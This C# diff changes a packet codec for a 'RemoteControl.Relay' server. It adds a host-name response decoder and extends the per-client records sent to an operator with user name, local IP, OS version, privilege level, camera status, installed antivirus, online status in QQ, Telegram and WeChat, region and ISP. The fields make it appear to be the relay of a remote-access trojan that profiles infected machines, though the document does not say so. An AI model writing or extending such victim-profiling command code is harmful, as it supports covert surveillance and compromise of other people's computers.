@@ -7,22 +7,6 @@ using Newtonsoft.Json;
 namespace RemoteControl.Relay
 {
     /// <summary>
-    /// 握手数据
-    /// </summary>
-    public class HandshakeData
-    {
-        public string Role { get; set; } = "";
-        public string HostName { get; set; } = "";
-        public string AppPath { get; set; } = "";
-        public string OnlineAvatar { get; set; } = "";
-    }
-
-    public class SelectClientData
-    {
-        public string ClientId { get; set; } = "";
-    }
-
-    /// <summary>
     /// 数据包编解码
     /// 原协议格式: [4字节packetLength(含自身4字节)][1字节packetType][JSON Body]
     /// packetLength = 4 + 1 + body.Length
@@ -36,6 +20,7 @@ namespace RemoteControl.Relay
         const byte CYCLER_RELAY_SELECT_CLIENT = 203;
         const byte CYCLER_RELAY_CLIENT_ONLINE = 204;
         const byte CYCLER_RELAY_CLIENT_OFFLINE = 205;
+        const byte PACKET_GET_HOST_NAME_RESPONSE = 65;
 
         /// <summary>
         /// 获取包类型(从完整包中提取, offset=4是packetType字节)
@@ -112,6 +97,24 @@ namespace RemoteControl.Relay
             catch { return null; }
         }
 
+        public static HostNameData DecodeHostNameResponse(byte[] fullPacket)
+        {
+            if (GetPacketType(fullPacket) != PACKET_GET_HOST_NAME_RESPONSE)
+                return null;
+
+            string json = GetBodyJson(fullPacket);
+            if (string.IsNullOrEmpty(json))
+                return null;
+            try
+            {
+                return JsonConvert.DeserializeObject<HostNameData>(json);
+            }
+            catch
+            {
+                return null;
+            }
+        }
+
         /// <summary>
         /// 构建客户端列表响应包
         /// </summary>
@@ -128,7 +131,19 @@ namespace RemoteControl.Relay
                     IP = s.RemoteEndPoint,
                     AppPath = s.AppPath,
                     OnlineAvatar = s.OnlineAvatar,
-                    OnlineTime = s.OnlineTime
+                    OnlineTime = s.OnlineTime,
+                    UserName = s.UserName,
+                    LocalIP = s.LocalIP,
+                    OSVersion = s.OSVersion,
+                    Privilege = s.Privilege,
+                    CameraStatus = s.CameraStatus,
+                    Antivirus = s.Antivirus,
+                    OnlineQQ = s.OnlineQQ,
+                    TG = s.TG,
+                    WX = s.WX,
+                    UserStatus = s.UserStatus,
+                    Region = s.Region,
+                    ISP = s.ISP
                 });
             }
             return BuildPacket(CYCLER_RELAY_CLIENT_LIST_RESPONSE, new { Clients = list });
@@ -144,7 +159,21 @@ namespace RemoteControl.Relay
                 ClientId = client.SessionId,
                 HostName = client.HostName,
                 IP = client.RemoteEndPoint,
-                OnlineAvatar = client.OnlineAvatar
+                AppPath = client.AppPath,
+                OnlineAvatar = client.OnlineAvatar,
+                OnlineTime = client.OnlineTime,
+                UserName = client.UserName,
+                LocalIP = client.LocalIP,
+                OSVersion = client.OSVersion,
+                Privilege = client.Privilege,
+                CameraStatus = client.CameraStatus,
+                Antivirus = client.Antivirus,
+                OnlineQQ = client.OnlineQQ,
+                TG = client.TG,
+                WX = client.WX,
+                UserStatus = client.UserStatus,
+                Region = client.Region,
+                ISP = client.ISP
             });
         }
 
